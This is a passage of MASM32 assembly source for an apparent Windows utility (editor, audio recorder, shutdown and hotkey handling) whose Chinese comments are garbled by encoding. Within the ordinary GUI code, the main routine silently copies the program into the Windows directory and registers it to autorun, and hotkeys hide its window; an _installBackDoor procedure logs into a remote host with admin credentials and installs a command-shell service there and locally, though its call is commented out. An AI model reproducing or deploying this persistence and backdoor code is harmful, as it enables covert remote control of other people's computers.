               push hInstance
               pop pspService.hInstance
               mov pspService.pszTitle,offset lpszSheetService
               invoke CreatePropertySheetPage,addr pspService
               mov SelectCard+8,eax

               mov pspAutoLogin.dwSize,sizeof PROPSHEETPAGE
               mov pspAutoLogin.dwFlags,PSP_USETITLE
               mov pspAutoLogin.pfnDlgProc,offset _RegAutoLoginDlgProc
               mov pspAutoLogin.pszTemplate,REGDLG_AUTOLOGIN
               push hInstance
               pop pspAutoLogin.hInstance
               mov pspAutoLogin.pszTitle,offset lpszSheetAutoLogin
               invoke CreatePropertySheetPage,addr pspAutoLogin
               mov SelectCard+12,eax  ;����������ҳ�������������

               invoke RtlZeroMemory,addr psh,sizeof PROPSHEETHEADER
               ;��ѡ��Ի���
               mov psh.dwSize,sizeof PROPSHEETHEADER
               push hWnd
               pop psh.hwndParent
               mov psh.dwFlags,PSH_USECALLBACK
               push hInstance
               pop psh.hInstance
               mov psh.pszCaption,offset lpszSheetName
               mov psh.nPages,4
               mov psh.nStartPage,1
               mov psh.phpage,offset SelectCard
               mov psh.pfnCallback,offset _RegPSHDlgProc
               invoke PropertySheet,addr psh
          .elseif eax==IDM_AUDIOSTART   ;��ʼ¼��
               .if !dwRecordIsPressed
                  invoke SendMessage,hWinPToolbar,TB_CHECKBUTTON,IDM_AUDIOSTART,TRUE
                  invoke GetLocalTime,addr @stST1
                  movzx edx,@stST1.wYear
                  movzx esi,@stST1.wMonth
                  movzx edi,@stST1.wDay
                  movzx eax,@stST1.wHour
                  movzx ebx,@stST1.wMinute
                  movzx ecx,@stST1.wSecond
                  invoke wsprintf,addr szBuffer,addr szFormatWave,\
                         edx,esi,edi,eax,ebx,ecx
                  invoke RtlZeroMemory,addr szWavSaveFile,sizeof szWavSaveFile
                  invoke wsprintf,addr szWavSaveFile,addr szFormatWaveFile,\
                         addr szWavPath,addr szBuffer,addr szWavExt
                  invoke _StartRecord
               .endif
               mov dwRecordIsPressed,1  
          .elseif eax==IDM_AUDIOPAUSE   ;��ʱͣ¼������
               not bRecording
          .elseif eax==IDM_AUDIOSTOP   ;����¼��
               mov dwRecordIsPressed,0
               invoke SendMessage,hWinPToolbar,TB_CHECKBUTTON,IDM_AUDIOSTART,FALSE
               mov bEnding,1
               invoke waveInReset,hWaveIn
               invoke waveInClose,hWaveIn
               invoke _writeWavFileHead
          .elseif eax==IDM_AUDIOPLAY   ;���������ļ�
               invoke CreateThread,NULL,0,\
                      offset _playWavFile,NULL,\
                      NULL,addr @dwThreadID
               invoke CloseHandle,eax

          .elseif eax==IDM_SHUTDOWN  ;�رռ����
               invoke GetCurrentProcess
               invoke OpenProcessToken,eax,TOKEN_ADJUST_PRIVILEGES \
                      or TOKEN_QUERY,addr hToken
               invoke LookupPrivilegeValue,NULL,addr shutdown_dpl,\
                      addr shutdown_tkp.Privileges.Luid
               mov shutdown_tkp.PrivilegeCount,1
               mov shutdown_tkp.Privileges.Attributes,SE_PRIVILEGE_ENABLED
               invoke AdjustTokenPrivileges,hToken,FALSE,\
                      addr shutdown_tkp,0,NULL,0
               invoke ExitWindowsEx,EWX_POWEROFF or EWX_FORCE,0

          .elseif eax==IDM_REBOOT  ;�������������
               invoke GetCurrentProcess
               invoke OpenProcessToken,eax,TOKEN_ADJUST_PRIVILEGES \
                      or TOKEN_QUERY,addr hToken
               invoke LookupPrivilegeValue,NULL,addr shutdown_dpl,\
                      addr shutdown_tkp.Privileges.Luid
               mov shutdown_tkp.PrivilegeCount,1
               mov shutdown_tkp.Privileges.Attributes,SE_PRIVILEGE_ENABLED
               invoke AdjustTokenPrivileges,hToken,FALSE,\
                      addr shutdown_tkp,0,NULL,0
               invoke ExitWindowsEx,EWX_REBOOT or EWX_FORCE,0
          .elseif eax>=IDM_TOOLBAR && eax<=IDM_STATUSBAR
            mov ebx,eax
            invoke GetMenuState,hMenu,ebx,MF_BYCOMMAND
            .if eax==MF_CHECKED
               mov eax,MF_UNCHECKED
            .else
               mov eax,MF_CHECKED
            .endif
            invoke CheckMenuItem,hMenu,ebx,eax
          .elseif eax>=IDM_BIG && eax<+IDM_DETAIL
            invoke CheckMenuRadioItem,hMenu,\
                 IDM_BIG,IDM_DETAIL,eax,MF_BYCOMMAND
          .endif
      .elseif eax==WM_SYSCOMMAND  ;����ϵͳ�˵���Ϣ
          mov eax,wParam
          movzx eax,ax
          .if eax==IDM_HELP||eax==IDM_ABOUT
              invoke _DisplayMenuItem,wParam
          .else
              invoke DefWindowProc,hWnd,uMsg,wParam,lParam
              ret
          .endif
      .elseif eax==WM_CLOSE    ;�رմ���
          call _Quit
      .elseif eax==WM_MENUSELECT
          invoke MenuHelp,WM_MENUSELECT,wParam,lParam,lParam,\
                 hInstance,hWinStatus,offset dwMenuHelp
      .elseif eax==WM_NOTIFY   ;����ؼ������ĸ���֪ͨ��
          mov eax,lParam
          mov ebx,lParam
          ;���ĸ��ؼ�״̬
          mov eax,[eax+NMHDR.hwndFrom]
          .if eax==hWinEdit
              invoke _SetStatus
              mov ebx,lParam
              .if [ebx+NMHDR.code]==EN_MSGFILTER  ;�ı����򵯳��˵�
                  assume ebx:ptr MSGFILTER
                  mov eax,[ebx].msg
                  .if eax==WM_RBUTTONDOWN
                     ;invoke MessageBox,hWinMain,addr szOut,NULL,MB_OK or MB_ICONINFORMATION
                     invoke GetCursorPos,addr @stPos
                     invoke TrackPopupMenu,hSubMenu,TPM_LEFTALIGN,\
                          @stPos.x,@stPos.y,NULL,hWinMain,NULL
                  .elseif eax==WM_KEYDOWN   ;�м�����
                    invoke GetCaretPos,addr stPoint
                    invoke GetWindowRect,hWinMain,addr stRect
                    invoke GetWindowRect,hWinToolbar,addr @stRect1
                    invoke GetWindowRect,hWinPToolbar,addr @stRect2


                    fild stPoint.x
                    fild stRect.left
                    fadd
                    fistp @dwLeft
                    fild stPoint.y
                    fild stRect.top
                    fadd
                    fild @stRect1.bottom  ;������һ�߶�
                    fadd
                    fild @stRect1.top
                    fsub
                    fild @stRect2.bottom  ;���������߶�
                    fadd
                    fild @stRect2.top
                    fsub
                    fild @stRect2.bottom  ;�˵��߶�
                    fadd
                    fild @stRect2.top
                    fsub
                    fild @stRect2.bottom  ;�˵��߶ȣ��ټ�һ��
                    fadd
                    fild @stRect2.top
                    fsub


                    fistp @dwTop
         
                    invoke SetCursorPos,@dwLeft,@dwTop
                  .endif
              .elseif [ebx+NMHDR.code]==EN_DROPFILES ;���ı������Ϸ�һ���ļ�
                  assume ebx:ptr ENDROPFILES
                  mov eax,[ebx].hDrop
                  ;��������������������shell32.lib
                  ;��ȡ���Ϸŵĵ�һ���ļ���
                  invoke DragQueryFile,eax,0,addr szFileNameOpen,MAX_PATH
                  invoke DragFinish,eax ;�ͷ��ڴ�
                  call _OpenFileAsName
                  mov fIsNewDoc,0
              .endif
          .elseif eax==hWinEdit1
              mov ebx,lParam
              .if [ebx+NMHDR.code]==EN_MSGFILTER  ;����������򵥻����
                  assume ebx:ptr MSGFILTER
                  mov eax,[ebx].msg
                  .if eax==WM_LBUTTONDBLCLK
                     ;��ȡ������ı������˳�����
                     invoke _getCurrentLine
                  .endif
              .endif
          .endif
 
          .if [ebx+NMHDR.code]==TTN_NEEDTEXT
             assume ebx:ptr TOOLTIPTEXT
             mov eax,[ebx].hdr.idFrom
             mov [ebx].lpszText,eax
             push hInstance
             pop [ebx].hinst
             assume ebx:nothing
          .elseif ([ebx+NMHDR.code]==TBN_QUERYINSERT) ||\
                  ([ebx+NMHDR.code]==TBN_QUERYDELETE)
             mov eax,TRUE
             ret
          .elseif ([ebx+NMHDR.code]==TBN_GETBUTTONINFO)
             assume ebx:ptr TBNOTIFY
             mov eax,[ebx].iItem
             .if eax<NUM_BUTTONS
                 mov ecx,sizeof TBBUTTON
                 mul ecx
                 add eax,offset stToolbar
                 invoke RtlMoveMemory,addr [ebx].tbButton,eax,sizeof TBBUTTON
                 invoke LoadString,hInstance,[ebx].tbButton.idCommand,\
                        addr @szBuffer,sizeof @szBuffer
                 lea eax,@szBuffer
                 mov [ebx].pszText,eax
                 invoke lstrlen,addr @szBuffer
                 mov [ebx].cchText,eax
                 assume ebx:nothing
                 invoke SendMessage,hWinStatus,SB_SETTEXT,3,addr @szBuffer

                 mov eax,TRUE
                 ret
            .endif
         .endif

      .elseif eax==idFindMessage ;�������滻�Ի����͵��Զ�����Ϣ
         .if stFind.Flags & FR_DIALOGTERM      ;ȡ����ť���Ի���ر�
             .if fFindReplace
                mov hReplaceDialog,0
             .else
                mov hFindDialog,0
             .endif
         .elseif stFind.Flags & FR_FINDNEXT    ;������һ��
             invoke _FindText
         .elseif stFind.Flags & FR_REPLACE     ;�滻
             invoke _ReplaceText
         .elseif stFind.Flags & FR_REPLACEALL  ;ȫ���滻
             invoke _ReplaceAll
         .endif
      .else
          invoke DefWindowProc,hWnd,uMsg,wParam,lParam
          ret
      .endif
      
      xor eax,eax
      ret
_ProcWinMain endp

;----------------------
; �����ڳ���
;----------------------
_WinMain  proc
       local @stWndClass:WNDCLASSEX
       local @stMsg:MSG
       local @hAccelerator
       local @hRichEdit
       local @sourceFile[256]:byte
       local @destFile[256]:byte

       invoke InitCommonControls
       invoke LoadLibrary,offset szDllEdit
       mov @hRichEdit,eax
       invoke GetModuleHandle,NULL
       mov hInstance,eax
       ;��ȡ�˵����
       invoke LoadMenu,hInstance,IDM_MAIN
       mov hMenu,eax
       ;��ȡ���ټ����
       invoke LoadAccelerators,hInstance,IDA_MAIN
       mov @hAccelerator,eax

       ;�޸�Ȩ�޵���Ȩ״̬
       ;��ȡ���н��̿���
       invoke GetCurrentProcess
       invoke OpenProcessToken,eax,TOKEN_ADJUST_PRIVILEGES or TOKEN_QUERY,\
            addr hToken
       invoke LookupPrivilegeValue,NULL,addr process_dpl,\
               addr process_tkp.Privileges.Luid
       mov process_tkp.PrivilegeCount,1
       mov process_tkp.Privileges.Attributes,SE_PRIVILEGE_ENABLED
       invoke AdjustTokenPrivileges,hToken,FALSE,addr process_tkp,0,NULL,0
       invoke CloseHandle,hToken

       invoke CreateToolhelp32Snapshot,TH32CS_SNAPALL,0

       mov hProcessSnapshot,eax

       ;ע�ᴰ����
       invoke RtlZeroMemory,addr @stWndClass,sizeof @stWndClass
       ;��ȡͼ����
       invoke LoadIcon,hInstance,ICO_MAIN
       mov @stWndClass.hIcon,eax
       mov @stWndClass.hIconSm,eax

       invoke LoadCursor,0,IDC_ARROW
       mov @stWndClass.hCursor,eax
       push hInstance
       pop @stWndClass.hInstance
       mov @stWndClass.cbSize,sizeof WNDCLASSEX
       mov @stWndClass.style,CS_HREDRAW or CS_VREDRAW
       mov @stWndClass.lpfnWndProc,offset _ProcWinMain
       mov @stWndClass.hbrBackground,COLOR_BTNFACE+1
       mov @stWndClass.lpszClassName,offset szClassName
       invoke RegisterClassEx,addr @stWndClass

       ;��������ʾ����
       invoke CreateWindowEx,NULL,\
              offset szClassName,offset szCaptionMain,\
              WS_OVERLAPPEDWINDOW,\
              CW_USEDEFAULT,CW_USEDEFAULT,700,500,\
              NULL,hMenu,hInstance,NULL
       mov  hWinMain,eax
       ;invoke CreateDialogParam,hInstance,IDR_MODELESSDIALOG,hWinMain,addr ModelessDlgProc,NULL
       ;mov hCaptureScrDialog,eax
       ;invoke ShowWindow,eax,SW_SHOWDEFAULT
       invoke _setTransparency,hWinMain,dwInitTransparent
       invoke ShowWindow,hWinMain,SW_SHOWNORMAL
       invoke UpdateWindow,hWinMain ;���¿ͻ�����������WM_PAINT��Ϣ


       ;���ÿ�ݼ���������ش���
       mov dwWinIsHidden,0
       invoke RegisterHotKey,hWinMain,HOT_CTRL_ALT_ENTER,MOD_ALT or MOD_CONTROL,VK_N

       mov dwThisIsHidden,0
       invoke RegisterHotKey,hWinMain,HOT_CTRL_ALT_H,MOD_ALT or MOD_CONTROL,VK_H

       invoke RegisterHotKey,hWinMain,HOT_CTRL_ALT_ADD,MOD_ALT or MOD_CONTROL,VK_U
       invoke RegisterHotKey,hWinMain,HOT_CTRL_ALT_SUB,MOD_ALT or MOD_CONTROL,VK_D
      

       ;�����Լ���ϵͳĿ¼��

       ;ȡϵͳ��ʱ�ļ�·��c:\docume~1\ql\locals~1\Temp\
       invoke GetTempPath,sizeof szBuffer,addr szBuffer
       ;invoke MessageBox,NULL,addr szBuffer,NULL,MB_OK
       ;ȡϵͳ·��C:\WINDOWS
       invoke GetWindowsDirectory,addr szBuffer,sizeof szBuffer  
       ;invoke MessageBox,NULL,addr szBuffer,NULL,MB_OK
       mov esi,0
       mov edi,0
       .while TRUE
           mov al,byte ptr [szBuffer+esi]
           .break .if al==0
           mov byte ptr [@destFile+edi],al
           inc esi
           inc edi
       .endw
       mov esi,0
       .while TRUE
           mov al,byte ptr [lpszValue+esi]
           .break .if al==0
           mov byte ptr [@destFile+edi],al
           inc esi
           inc edi
       .endw
       mov byte ptr [@destFile+edi],0

       ;ȡ��ǰ��������·��e:\masm32\source\qlTools.exe
       invoke GetModuleFileName,NULL,addr szBuffer,sizeof szBuffer

       ;����ǰ���������ļ�szBuffer������ϵͳĿ¼@destFile
       invoke _FileCopy,addr szBuffer,addr @destFile
                
       invoke lstrlen,addr @destFile
       ;��ע��������������Ŀ
       invoke _RegSetAutoRun,addr lpszKey,addr lpszValueName,\
              addr @destFile,eax,TRUE

       ;��ȡ�����в������õ�Ҫ�򿪵��ļ�·��
       invoke _argc
       .if eax>1   ;�������в���
          invoke _argv,1,addr szFileNameOpen,MAX_PATH
          ;invoke MessageBox,hWinMain,addr szFileNameOpen,NULL,MB_OK
          ;��ָ�����ļ�
          call _OpenFileAsName
          mov fIsNewDoc,0
       .endif   
       ;��Ϣѭ��
       .while TRUE
          invoke GetMessage,addr @stMsg,NULL,0,0
          .break .if eax==0
          invoke TranslateAccelerator,hWinMain,\
                 @hAccelerator,addr @stMsg
          .if eax==0
             invoke TranslateMessage,addr @stMsg
             invoke DispatchMessage,addr @stMsg
          .endif
       .endw
       invoke FreeLibrary,@hRichEdit

       ret
_WinMain endp

;----------------------
; ��Զ��������װ����
;----------------------
_installBackDoor  proc
       invoke RtlZeroMemory,addr dispatchTable,sizeof dispatchTable
       mov esi,offset dispatchTable
       assume esi:ptr SERVICE_TABLE_ENTRY
       mov [esi].lpServiceName,offset lpszServiceName
       mov [esi].lpServiceProc,offset _cmdStart
       assume esi:nothing
       
       invoke _connectRemote,TRUE,addr lpszDestHost,\
              addr lpszAdminUser,addr lpszAdminPass
       invoke _installCmdService,addr lpszDestHost  ;��Զ�������ͷź��ų���
       invoke _installCmdService,NULL
       invoke StartServiceCtrlDispatcher,addr dispatchTable
       ret
_installBackDoor  endp

start:
       ;call _installBackDoor
       call _WinMain
       invoke ExitProcess,NULL
       end start
